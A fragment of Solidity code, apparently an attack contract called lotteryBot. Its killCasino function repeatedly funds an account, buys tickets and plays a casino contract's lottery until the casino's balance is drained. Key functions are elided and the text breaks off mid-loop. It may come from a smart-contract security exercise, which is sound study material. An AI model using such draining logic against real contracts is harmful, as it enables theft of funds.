...
contract lotteryBot {
    ...
    function fundBotAccount() private {
        if(accountMade == false) {
            require(address(this).balance >= 2.005 gwei, "not enough in the contract");
            t.fundAccount{value: 2.005 gwei}();
            accountMade = true;
        } else {
            require(address(this).balance >= 2 gwei, "not enough in the contract");
            t.fundAccount{value: 2 gwei}();
        }
    }
    ...
    function killCasino() public {
        while(address(casino).balance > 1 gwei) {
            fundBotAccount();
            getTicket();
            playLottery();
            reFinance();
